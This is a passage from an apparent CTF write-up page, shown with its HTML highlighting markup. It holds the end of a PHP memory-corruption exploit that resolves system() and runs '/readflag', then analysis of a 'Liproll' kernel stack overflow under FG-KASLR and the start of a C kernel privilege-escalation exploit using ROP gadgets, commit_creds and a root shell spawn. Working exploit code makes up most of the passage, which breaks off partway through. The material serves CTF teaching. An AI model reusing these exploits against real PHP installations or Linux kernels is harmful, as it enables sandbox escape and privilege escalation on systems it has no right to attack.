class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="variable">$f_entry</span> = super_leak(<span class="variable">$addr</span>);</span><br><span class="line">        <span class="variable">$f_name</span> = super_leak(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">            <span class="keyword">return</span> super_leak(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy_closure_struct</span>(<span class="params">&amp;<span class="variable">$to</span>, <span class="variable">$from</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">0x110</span>; <span class="variable">$i</span>+=<span class="number">8</span>) &#123;</span><br><span class="line">        <span class="variable">$tmp</span> = super_leak(<span class="variable">$from</span>, <span class="variable">$i</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span>&lt;<span class="number">8</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">            <span class="variable">$to</span>[<span class="variable">$i</span>+<span class="variable">$j</span>] = chr(<span class="variable">$tmp</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$tmp</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_flag</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$flag</span>, <span class="variable">$down</span>=<span class="number">1</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">30000</span>*<span class="number">8</span>; <span class="variable">$i</span>+=<span class="number">8</span>) &#123;</span><br><span class="line">        <span class="variable">$d1</span> = super_leak(<span class="variable">$addr</span>, <span class="variable">$i</span>*<span class="variable">$down</span>);</span><br><span class="line">        <span class="variable">$d2</span> = super_leak(<span class="variable">$addr</span>, (<span class="variable">$i</span>+<span class="number">8</span>)*<span class="variable">$down</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$d1</span> == <span class="variable">$flag</span> &amp;&amp; <span class="variable">$d2</span> == <span class="variable">$flag</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$down</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span> + <span class="variable">$down</span>*<span class="variable">$i</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$addr</span> + <span class="variable">$down</span>*<span class="variable">$i</span> - <span class="number">0x1f8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_fake_closure</span>(<span class="params">&amp;<span class="variable">$helper</span>, <span class="variable">$system_addr</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">4</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$helper</span>[<span class="variable">$i</span> + <span class="number">0x38</span>] = chr(<span class="variable">$tmp</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$tmp</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$system_addr</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$helper</span>[<span class="variable">$i</span> + <span class="number">0x68</span>] = chr(<span class="variable">$tmp</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$tmp</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$obj</span>, <span class="variable">$origin_object</span>;</span><br><span class="line">    <span class="variable">$padding</span> = <span class="keyword">new</span> vline();</span><br><span class="line">    hackphp_create(<span class="number">0x70</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$obj</span> = <span class="keyword">new</span> vline();</span><br><span class="line">    <span class="variable">$obj</span>-&gt;aaa = <span class="string">&quot;aaaaaaaaaaaaaaaaaaaa&quot;</span>;</span><br><span class="line">    <span class="variable">$obj</span>-&gt;bbb = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;&#125;;</span><br><span class="line">    <span class="variable">$obj</span>-&gt;ccc = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="variable">$obj</span>-&gt;ddd = <span class="number">1.11111111</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$origin_object</span> = leak_origin_object_content();</span><br><span class="line">    <span class="variable">$elf_base</span> = basic_leak(<span class="variable">$origin_object</span>, <span class="number">0x18</span>, <span class="number">8</span>) - <span class="number">0xffe520</span>;</span><br><span class="line">    <span class="variable">$obj_base</span> = basic_leak(<span class="variable">$origin_object</span>, <span class="number">0x70</span>, <span class="number">8</span>) - <span class="number">0x70</span>*<span class="number">2</span>;</span><br><span class="line">    <span class="variable">$closure_obj</span> = basic_leak(<span class="variable">$origin_object</span>, <span class="number">0x38</span>, <span class="number">8</span>);</span><br><span class="line">    printf(<span class="string">&quot;[DEBUG] leak elf_base: 0x%x\n&quot;</span>, <span class="variable">$elf_base</span>);</span><br><span class="line">    printf(<span class="string">&quot;[DEBUG] leak obj_base: 0x%x\n&quot;</span>, <span class="variable">$obj_base</span>);</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$origin_object</span>, <span class="number">0x28</span>, <span class="variable">$obj_base</span> + <span class="number">0x58</span>);</span><br><span class="line">    write(<span class="variable">$origin_object</span>, <span class="number">0x30</span>, <span class="number">0xa</span>);</span><br><span class="line">    write(<span class="variable">$origin_object</span>, <span class="number">0x58</span>, <span class="number">0x2</span>);</span><br><span class="line">    write(<span class="variable">$origin_object</span>, <span class="number">0x68</span>, <span class="number">0x6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$elf</span> = parse_elf(<span class="variable">$elf_base</span>);</span><br><span class="line">    <span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$elf_base</span>, <span class="variable">$elf</span>);</span><br><span class="line">    <span class="variable">$system_addr</span> = get_system(<span class="variable">$basic_funcs</span>);</span><br><span class="line">    printf(<span class="string">&quot;[DEBUG] parse data_addr: 0x%x\n&quot;</span>, <span class="variable">$elf</span>[<span class="number">0</span>]);</span><br><span class="line">    printf(<span class="string">&quot;[DEBUG] parse text_size: 0x%x\n&quot;</span>, <span class="variable">$elf</span>[<span class="number">1</span>]);</span><br><span class="line">    printf(<span class="string">&quot;[DEBUG] parse data_size: 0x%x\n&quot;</span>, <span class="variable">$elf</span>[<span class="number">2</span>]);</span><br><span class="line">    printf(<span class="string">&quot;[DEBUG] leak system_addr: 0x%x\n&quot;</span>, <span class="variable">$system_addr</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = str_repeat(<span class="string">&#x27;p&#x27;</span>, <span class="number">0x200</span>);</span><br><span class="line">    <span class="variable">$helper_addr</span> = find_flag(<span class="variable">$obj_base</span>, <span class="number">0x7070707070707070</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$helper_addr</span> == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="variable">$helper_addr</span> = find_flag(<span class="variable">$obj_base</span>, <span class="number">0x7070707070707070</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$helper_addr</span> == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;not found!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(<span class="string">&quot;[DEBUG] leak helper_addr: 0x%x\n&quot;</span>, <span class="variable">$helper_addr</span>);</span><br><span class="line">    copy_closure_struct(<span class="variable">$helper</span>, <span class="variable">$closure_obj</span>);</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$origin_object</span>, <span class="number">0x38</span>, <span class="variable">$helper_addr</span>);</span><br><span class="line">    generate_fake_closure(<span class="variable">$helper</span>, <span class="variable">$system_addr</span>);</span><br><span class="line"></span><br><span class="line">    (<span class="variable">$obj</span>-&gt;bbb)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="comment">//var_dump($elf);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;/readflag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3><span id="liproll">Liproll</span></h3><p>The challenge is inspired by <code>hxpctf 2020 kernel-rop</code>.</p><p>The use of <a href="https://lwn.net/Articles/824307/">fine-grained kaslr</a> makes it difficult to construct the ROP chain.</p><p>After <code>FG-KASLR</code> is turned on, it will cause vmlinux and the corresponding kernel module to be segmented by function, and then the function loading order will be disrupted on the basis of the original address randomization, and the offset of the function on the basis of <code>vmlinux_base_addr</code> cannot be determined by static analysis.</p><p>The vulnerability is in the <code>cast_a_spell</code> function:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">cast_a_spell</span><span class="params">(__int64 *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rsi</span></span><br><span class="line">  _BYTE buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// [rsp+100h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+110h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( global_buffer )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = global_buffer;</span><br><span class="line">    v1 = *((_DWORD *)a1 + <span class="number">2</span>);</span><br><span class="line">    v2 = <span class="number">256</span>;</span><br><span class="line">    v3 = *a1;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">0x100</span> )</span><br><span class="line">      v2 = *((_DWORD *)a1 + <span class="number">2</span>);</span><br><span class="line">    size = v2;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_from_user(buf, v3, v1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span>(global_buffer, buf, *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)a1 + <span class="number">2</span>));</span><br><span class="line">      global_buffer = ptr;</span><br><span class="line">      *((_DWORD *)&amp;global_buffer + <span class="number">2</span>) = size;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    cast_a_spell_cold();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>v1</code> is the parameter passed in. If <code>v1 &gt; 0x100</code>, it will cause a stack overflow. This overflow will overwrite the <code>ptr</code> and <code>size</code> variables. The <code>read</code> and <code>write</code> functions rely on the <code>ptr</code> and <code>size</code> stored in <code>global_buffer</code>. It is equivalent to the opportunity for us to <code>read</code> and <code>write</code> at will.</p><p>In the original question of <code>hxpctf</code>, the real offset of the function is obtained by reading the structure of the <code>.symtab</code> section, and the read <code>function</code> in this challenge limits the scope of reading:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">liproll_read</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD v4[<span class="number">35</span>]; <span class="comment">// [rsp+0h] [rbp-118h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4[<span class="number">32</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( global_buffer )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)global_buffer &lt; vmlinux_base + <span class="number">0x12EE908</span> <span class="comment">//正好是 .symtab 段范围</span></span><br><span class="line">      || (<span class="keyword">unsigned</span> __int64)global_buffer &gt;= vmlinux_base + <span class="number">0x13419A0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span>(v4, global_buffer, *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;global_buffer + <span class="number">2</span>));</span><br><span class="line">      copy_to_user(a2, v4, a3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      liproll_read_cold();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This shows that there is no way to get the true offset of the function by reading <code>.symtab</code>.</p><p>Another approach (expected solution) is to use <code>fake JIT-ROP</code>. Read the code segment through the memory leak vulnerability in this challenge to obtain the gagets we need, and then use the stack overflow to construct the <code>ROP chains</code>.</p><p>During the competition, some teams solved the challenge by <code>modeprobe_path</code> or by brute force search for <code>cred</code> structure on heap space. </p><p>Thanks to <code>r3kapig</code>, their member helped to find a unexpected solution which was fixed later. And there would be a big impact without the reminder from them.</p><h4><span id="exp">exp</span></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CREATE 0xD3C7F03</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHOOSE 0xD3C7F04</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RESET 0xD3C7F02</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CAST 0xD3C7F01</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spawn_shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">choose_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx;</span><br><span class="line">&#125;choose_args;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">cast_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">u_int8_t</span> *buf;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> len;</span><br><span class="line">&#125;cast_args;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">gadgets_find</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">size_t</span> commit_creds;</span><br><span class="line">    <span class="keyword">size_t</span> iretq_ret;</span><br><span class="line">    <span class="keyword">size_t</span> mov_rdi_rax_ret;</span><br><span class="line">    <span class="keyword">size_t</span> cmp_rdx_rcx;</span><br><span class="line">    <span class="keyword">size_t</span> pop_rdx_rcx;</span><br><span class="line">&#125;gadgets_find;</span><br><span class="line"></span><br><span class="line">gadgets_find found;</span><br><span class="line"><span class="keyword">int</span> fd, m;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">0x100</span>], canary, vmlinux_base;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdi_ret = <span class="number">0x16a8</span>;</span><br><span class="line"><span class="keyword">size_t</span> swapgs_popfq_ret = <span class="number">0x200eaa</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rbx_ret = <span class="number">0xb36</span>;</span><br><span class="line"><span class="keyword">u_int8_t</span> code_iretq_ret[] = &#123;<span class="number">0x48</span>, <span class="number">0xCF</span>, <span class="number">0xC3</span>&#125;;</span><br><span class="line"><span class="keyword">u_int8_t</span> code_prepare_kernel_cred[] = &#123;<span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xC5</span>, <span class="number">0x4C</span>, <span class="number">0x89</span>, <span class="number">0xE7</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xEE</span>, <span class="number">0xB9</span>, <span class="number">0x15</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB8</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF3</span>, <span class="number">0x48</span>, <span class="number">0xA5</span>, <span class="number">0x41</span>, <span class="number">0xC7</span>, <span class="number">0x04</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0xC7</span>&#125;;</span><br><span class="line"><span class="keyword">u_int8_t</span> code_commit_creds[] = &#123;<span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x65</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x7D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x55</span>, <span class="number">0x53</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0xAC</span>, <span class="number">0x24</span>, <span class="number">0x30</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x39</span>, <span class="number">0xAC</span>, <span class="number">0x24</span>, <span class="number">0x38</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x85</span>, <span class="number">0xE2</span>&#125;;</span><br><span class="line"><span class="keyword">u_int8_t</span> code_mov_rdi_rax_ret[] = &#123;<span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xC7</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xDB</span>, <span class="number">0x7F</span>, <span class="number">0xEA</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xF8</span>, <span class="number">0x5B</span>, <span class="number">0xC3</span>&#125;;</span><br><span class="line"><span class="keyword">u_int8_t</span> code_cmp_rdx_rcx[] = &#123;<span class="number">0x48</span>, <span class="number">0x39</span>, <span class="number">0xCA</span>, <span class="number">0x74</span>, <span class="number">0x01</span>, <span class="number">0xC3</span>&#125;;</span><br><span class="line"><span class="keyword">u_int8_t</span> code_pop_rdx_rcx[] = &#123;<span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0xC3</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">machinecode_cmp</span><span class="params">(<span class="keyword">u_int8_t</span> *a, <span class="keyword">u_int8_t</span> *b, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i] != b[i]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">char</span> *s)</span> </span>&#123;</span><br><span class="line">    perror(s);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 